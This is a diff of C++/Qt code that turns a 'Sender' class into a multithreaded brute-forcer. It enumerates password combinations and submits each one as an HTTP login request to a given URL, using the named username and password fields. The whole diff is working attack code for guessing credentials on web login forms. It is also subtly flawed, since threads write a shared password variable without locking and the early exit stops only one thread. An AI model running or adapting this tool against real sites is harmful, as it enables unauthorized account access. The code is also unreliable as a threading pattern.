@@ -11,58 +11,59 @@ Sender::Sender(
     size_t countThreads)
 {
     qDebug() << "Sender instantiated\n";
-
-    std::vector<std::thread> threads;
-
-
-    for (auto& t : threads) {
-        if (t.joinable()) {
-            t.join();
-        }
-    }
-
-    /*
-    if(this->resultT1 || this->resultT2){
-        qDebug("success!");
-    }
-    */
-    /*
-    bool success = this->tryPassword(
-        url,
-        nameOfLoginNameField,
-        nameToLogin,
-        passwordFieldName,
-        0
-        );
-    */
-}
-
-size_t calculateRange()
-{
-
+    this->tryPassword(url, nameOfLoginNameField, nameToLogin, passwordFieldName, countThreads);
 }
 
 Sender::~Sender(){
     qDebug() << "Sender destroyed\n";
 }
 
-void Sender::tryPassword(//unfinnished?
+void Sender::tryPassword(
     std::string url,
     std::string nameOfLoginNameField,
     std::string nameToLogin,
-    std::string passwordFieldName)
+    std::string passwordFieldName,
+    size_t numThreads)
 {
-    for(size_t i = this->rangeOfThreads; i <= 18446744073709551614; i++)
-    {
-        this->passwordTry = combination_at_index(i);
+    // Mutex for thread-safe access to shared resources
+    std::mutex trySuccessMutex;
 
-        const std::string concatenated = std::string("password try:") + this->passwordTry;
-        const char* output = concatenated.c_str();
-        qDebug(output);
+    // Function that each thread will run
+    auto threadFunction = [this, &url, &nameOfLoginNameField, &nameToLogin, &passwordFieldName, &trySuccessMutex](size_t startIndex, size_t endIndex) {
+        for (size_t i = startIndex; i < endIndex; i++) {
+            this->passwordTry = combination_at_index(i);
 
-        HttpReq req(url, nameOfLoginNameField, nameToLogin, passwordFieldName, passwordTry);
-        if(req.sendReq())
-            this->trySuccess = true;
+            const std::string concatenated = "password try: " + this->passwordTry;
+            const char* output = concatenated.c_str();
+            qDebug(output);
+
+            HttpReq req(url, nameOfLoginNameField, nameToLogin, passwordFieldName, passwordTry);
+            if (req.sendReq()) {
+                // Lock mutex to modify shared variable trySuccess
+                std::lock_guard<std::mutex> lock(trySuccessMutex);
+                this->trySuccess = true;
+                break; // Exit early if successful password found
+            }
+        }
+    };
+
+    // Calculate the range each thread will process
+    size_t totalCombinations = 18446744073709551615; // 2^64 - 1
+    size_t rangePerThread = totalCombinations / numThreads;
+
+    std::vector<std::thread> threads;
+
+    // Start threads
+    for (size_t t = 0; t < numThreads; t++) {
+        size_t startIndex = t * rangePerThread;
+        size_t endIndex = (t == numThreads - 1) ? totalCombinations : (t + 1) * rangePerThread;
+
+        threads.emplace_back(threadFunction, startIndex, endIndex);
+    }
+
+    // Wait for all threads to finish
+    for (auto& t : threads) {
+        t.join();
     }
 }
 
